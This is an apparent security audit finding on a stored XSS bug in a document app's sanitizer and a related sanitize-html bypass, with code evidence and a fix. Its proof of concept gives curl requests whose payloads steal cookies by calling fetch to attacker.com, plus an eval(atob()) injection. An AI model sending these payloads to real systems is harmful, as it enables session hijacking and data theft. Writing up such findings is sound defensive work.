# Finding: Stored XSS via `sanitizePlainText` Entity-Decode Ordering + CVE-2026-44990 `<xmp>` Bypass

## Severity
HIGH

## CVSS Estimate
CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:H/I:H/A:H = 8.7

## Affected Code
- **Sanitizer bug:** `lib/utils/sanitize-html.ts:12-19` (`sanitizePlainText`)
- **XSS sink:** `components/documents/document-header.tsx:604` (`dangerouslySetInnerHTML`)
- **Entry points:**
  - `pages/api/teams/[teamId]/documents/[id]/update-name.ts:15` (Zod transform)
  - `lib/zod/url-validation.ts:207` (document upload schema)
  - Agreement creation, team name changes, EE FAQ routes via `validateContent`

## Description
The `sanitizePlainText` function calls `sanitizeHtml` first (stripping literal HTML tags), then `decodeHTML` (decoding entities). This ordering is **fundamentally wrong**: encoded entities like `&lt;img src=x onerror=alert(1)&gt;` survive tag stripping because they aren't literal tags yet, then become real HTML tags after `decodeHTML` runs at line 14. The decoded payload is stored in PostgreSQL `Document.name` and rendered via `dangerouslySetInnerHTML` in `document-header.tsx` whenever any team member views the document.

Additionally, `sanitize-html` version 2.17.3 is vulnerable to **CVE-2026-44990** (CVSS 9.3): the `<xmp>` raw-text element bypass allows arbitrary HTML/JS injection even without entity encoding. The `<xmp>` tag is not in the default allowed-tags list but `sanitize-html`'s disallowed-tags mechanism treats `<xmp>` as a raw-text element whose content is passed through unmodified.

Entry points include at least 5 authenticated write paths: document rename, document upload, agreement creation, team name changes, and FAQ routes.

## Proof of Concept
1. **Inject XSS payload via document rename:**
   ```bash
   curl -X POST "https://papermark.app/api/teams/team_xxx/documents/doc_xxx/update-name" \
     -H "Content-Type: application/json" \
     -d '{"name": "&lt;img src=x onerror=fetch(\"https://attacker.com/steal?c=\"+document.cookie)&gt;"}'
   ```

2. **Alternative using CVE-2026-44990 `<xmp>` bypass** (no entity encoding needed):
   ```bash
   curl -X POST "https://papermark.app/api/teams/team_xxx/documents/doc_xxx/update-name" \
     -H "Content-Type: application/json" \
     -d '{"name": "<xmp><img src=x onerror=eval(atob(\"payload_code\"))></xmp>"}'
   ```

3. **XSS fires** in every team member's browser when viewing the document page at `components/documents/document-header.tsx:604`.

## Impact
Any team member who can rename a document can execute arbitrary JavaScript in the browser of every other team member who views the document page. This enables:
- Session token theft (document.cookie access)
- API key exfiltration
- Team data extraction via zero-auth API endpoints (F-001)
- Worm propagation by renaming other documents with the same XSS payload
- UI redressing for phishing within the trusted application context

## Evidence
```typescript
// lib/utils/sanitize-html.ts:11-18 — BUG: decode AFTER strip
export function sanitizePlainText(content: string) {
  const sanitized = sanitizeHtml(content, plainTextSanitizeConfig);  // Step 1: strip tags
  const decoded = decodeHTML(sanitized).normalize("NFC");            // Step 2: decode — TOO LATE
  return decoded.replace(controlCharsRegex, " ").replace(invisibleControlRegex, "").trim();
}
```

```typescript
// components/documents/document-header.tsx:604 — XSS sink
dangerouslySetInnerHTML={{ __html: prismaDocument.name }}
```

```typescript
// pages/api/teams/[teamId]/documents/[id]/update-name.ts:12-22 — entry point
const updateNameSchema = z.object({
  name: z.string().transform((value) => sanitizePlainText(value)).pipe(
    z.string().min(1).max(255),
  ),
});
```

## Methodology
- **First found by:** AI SAST (00-ai-sast.md) identified the entity-decoding ordering bug
- **Expanded by:** Structural analysis (01-structural-analysis.md) added CVE-2026-44990 `<xmp>` bypass context and reachability
- **Confirmed by:** Encoding analysis (01-encoding-analysis.md) confirmed encoding-differential root cause
- **Confirmed by:** Sanitizer analysis (01-sanitizer-bypass.md) traced all entry points and sinks
- **Missed by:** Stock semgrep rules (no rule for this pattern)

## Chain Potential
**Critical chain enabler.**
- **Chain 1 (XSS Worm):** Primary injection vector for worm propagation across team members. Estimated $8K-$15K.
- **Chain 2 (CORS + PDF):** Used as secondary persistence vector after CSRF file upload.
- **Chain 8 (Embed Clickjacking):** XSS fires in embed iframe context for credential theft via transparent overlay.
- **Chain 11 (CSP Amplifier):** XSS worm operates with zero CSP resistance and zero detection.

## Remediation
Fix the ordering in `sanitizePlainText`: call `decodeHTML` **before** `sanitizeHtml`, not after. This ensures encoded entities are decoded into literal text before tag stripping, so any decoded HTML tags are properly removed.

```typescript
export function sanitizePlainText(content: string) {
  const decoded = decodeHTML(content).normalize("NFC");  // Step 1: decode first
  const sanitized = sanitizeHtml(decoded, plainTextSanitizeConfig); // Step 2: then strip
  return sanitized.replace(controlCharsRegex, " ").replace(invisibleControlRegex, "").trim();
}
```

Additionally, upgrade `sanitize-html` from 2.17.3 to the latest version that patches CVE-2026-44990.
